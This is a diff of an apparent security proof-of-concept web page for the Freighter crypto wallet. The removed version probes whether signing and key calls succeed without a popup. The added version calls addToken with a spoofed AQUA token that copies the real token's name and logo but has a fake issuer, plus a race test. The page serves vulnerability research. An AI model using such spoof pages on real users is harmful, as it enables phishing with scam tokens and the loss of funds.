@@ -1,97 +1,64 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Unauthorized Provider Access PoC</title>
-    <style>
-        body { font-family: monospace; background: #0b0f19; color: #38bdf8; padding: 20px; }
-        .card { background: #1e293b; padding: 20px; border-radius: 8px; border: 1px solid #334155; margin-bottom: 15px; }
-        button { background: #7c3aed; color: white; border: none; padding: 12px 15px; border-radius: 6px; cursor: pointer; font-weight: bold; margin: 6px 0; width: 100%; text-align: left; }
-        button:hover { background: #6d28d9; }
-        .btn-danger { background: #dc2626; }
-        .btn-danger:hover { background: #b91c1c; }
-        #log { background: #020617; color: #4ade80; padding: 12px; border-radius: 6px; height: 220px; overflow-y: auto; white-space: pre-wrap; border: 1px solid #1e293b; font-size: 0.85rem; }
-    </style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Freighter addToken Spoof - 0x403for SAFE</title>
+<style>
+body{background:#000;color:#0f0;font-family:monospace;padding:12px;margin:0}
+h2{color:#ff0;font-size:13px}
+.origin{background:#111;color:#ff0;padding:6px;border:1px solid #333;font-size:11px;margin:6px 0}
+button{width:100%;padding:13px;margin:5px 0;background:#111;border-radius:6px;text-align:left;font-size:11px}
+.crit{border:1px solid #f00;color:#ff6b6b}
+.high{border:1px solid #ff9800;color:#ffb74d}
+.ok{border:1px solid #0f0;color:#0f0}
+pre{background:#0a0a0a;padding:8px;height:420px;overflow:auto;border:1px solid #333;font-size:10px;white-space:pre-wrap;word-break:break-all}
+</style>
 </head>
 <body>
+<h2>Freighter 1.25.28 - addToken Spoof [HIGH] - 0x403for</h2>
+<div class="origin" id="originBox">Origin: loading...</div>
 
-    <div class="card">
-        <h2>Uji Coba Unauthorized Provider API</h2>
-        <p>Menguji apakah fungsi dompet dapat dipanggil tanpa popup konfirmasi.</p>
-        
-        <button onclick="cekObjekProvider()">1. Cek Ketersediaan Objek Provider</button>
-        <button onclick="ujiGetPublicKey()">2. Uji Panggil getPublicKey() Tanpa Interaksi</button>
-        <button class="btn-danger" onclick="ujiSignTransaction()">3. Uji Panggil signTransaction() Diam-diam</button>
-    </div>
+<button class="ok" onclick="dumpApi()">1. DUMP freighterApi.addToken</button>
+<button class="high" onclick="addRealAqua()">2. addToken AQUA REAL GBNZ...</button>
+<button class="crit" onclick="addFakeAqua()">3. addToken AQUA FAKE same logo diff issuer - BUG TEST</button>
+<button class="high" onclick="addDouble()">4. Race REAL then FAKE</button>
 
-    <div class="card">
-        <h3>Live Execution Log:</h3>
-        <div id="log">[INFO] Provider test script loaded. Ready.</div>
-    </div>
+<pre id="log"></pre>
+<script>
+function log(t){document.getElementById('log').innerText+='['+new Date().toLocaleTimeString()+'] '+t+'\n';}
+function updateOrigin(){document.getElementById('originBox').innerText='Origin: '+location.origin;}
 
-    <script>
-        function log(msg) {
-            const logBox = document.getElementById('log');
-            const time = new Date().toLocaleTimeString();
-            logBox.innerText += `\n[${time}] ${msg}`;
-            logBox.scrollTop = logBox.scrollHeight;
-        }
+function dumpApi(){
+ updateOrigin();
+ log('=== DUMP ===');
+ if(window.freighterApi){
+  log('freighterApi.addToken = '+typeof window.freighterApi.addToken);
+ } else {
+  log('NOT FOUND - buka play.freighter.app seperti screenshot kamu 21.41');
+ }
+}
 
-        // 1. Memeriksa objek global yang disuntikkan dompet
-        function cekObjekProvider() {
-            log("[PROSES] Memeriksa objek injeksi dompet di window...");
-            
-            let detected = [];
-            if (typeof freighterApi !== 'undefined') detected.push('freighterApi');
-            if (typeof window.ethereum !== 'undefined') detected.push('window.ethereum');
-            if (typeof window.solana !== 'undefined') detected.push('window.solana');
+function addRealAqua(){
+ updateOrigin();
+ log('=== REAL AQUA ===');
+ let real={code:'AQUA', issuer:'GBNZILSTVQZ4R7IKQDGHYGY2HT5Q2QYMCHZECHUCBZ5QSE7F3N5TA2AQUA', domain:'aqua.network', name:'Aquarius REAL'};
+ log(JSON.stringify(real));
+ window.freighterApi.addToken(real).then(r=>log('Result REAL: '+JSON.stringify(r))).catch(e=>log('Error: '+e.message));
+}
 
-            if (detected.length > 0) {
-                log(`[BERHASIL] Objek dompet ditemukan: ${detected.join(', ')}`);
-                // Menampilkan properti yang tersedia di dalam freighterApi jika ada
-                if (typeof freighterApi !== 'undefined') {
-                    log("[INFO] Fungsi tersedia di freighterApi: " + Object.keys(freighterApi).join(', '));
-                }
-            } else {
-                log("[PERINGATAN] Tidak ada objek provider dompet standar yang terdeteksi di origin ini.");
-            }
-        }
+function addFakeAqua(){
+ updateOrigin();
+ log('=== FAKE AQUA SPOOF TEST HIGH ===');
+ let fake={code:'AQUA', issuer:'GDXNPOISONED0x403forEVILFAKE12345678901234567890', domain:'0x403for.github.io', name:'Aquarius', image:'https://aqua.network/favicon.png'};
+ log(JSON.stringify(fake));
+ log('Expected: Freighter harus warning issuer beda / show origin 0x403for');
+ log('BUG: Kalau tanpa warning = user ketipu token scam');
+ window.freighterApi.addToken(fake).then(r=>log('Result FAKE: '+JSON.stringify(r))).catch(e=>log('Error FAKE: '+e.message));
+}
 
-        // 2. Menguji pengambilan public key secara langsung
-        async function ujiGetPublicKey() {
-            log("[PROSES] Memanggil fungsi getPublicKey()...");
-            try {
-                if (typeof freighterApi !== 'undefined' && freighterApi.getPublicKey) {
-                    const pubKey = await freighterApi.getPublicKey();
-                    log(`[KRITIS!] Berhasil mendapatkan Public Key tanpa popup konfirmasi: ${pubKey}`);
-                    alert("Akses Data Sensitif Berhasil: " + pubKey);
-                } else {
-                    log("[INFO] freighterApi.getPublicKey tidak tersedia atau memerlukan inisialisasi dApp.");
-                }
-            } catch (err) {
-                log(`[TERPROTEKSI] Akses diblokir / memerlukan izin dompet: ${err.message}`);
-            }
-        }
-
-        // 3. Menguji penandatanganan transaksi secara otomatis
-        async function ujiSignTransaction() {
-            log("[PROSES] Menguji pemanggilan signTransaction()...");
-            try {
-                if (typeof freighterApi !== 'undefined' && freighterApi.signTransaction) {
-                    // Mengirim dummy payload transaksi untuk uji coba
-                    const dummyXdr = "AAAAAgAAAAD...[DUMMY_XDR_PAYLOAD]...";
-                    const signed = await freighterApi.signTransaction(dummyXdr);
-                    log(`[BAHAYA KRITIS!] Transaksi berhasil ditandatangani tanpa popup interaksi! Hasil: ${signed}`);
-                    alert("BERBAHAYA: Auto-signing transaksi berhasil dieksekusi!");
-                } else {
-                    log("[INFO] Fungsi signTransaction tidak ditemukan atau dibatasi oleh provider.");
-                }
-            } catch (err) {
-                log(`[TERPROTEKSI DENGAN BAIK] Eksekusi tertolak / memunculkan popup konfirmasi: ${err.message}`);
-            }
-        }
-    </script>
-
+function addDouble(){addRealAqua(); setTimeout(addFakeAqua,1500);}
+window.onload=()=>{updateOrigin(); log('Ready '+location.origin);};
+</script>
 </body>
 </html>
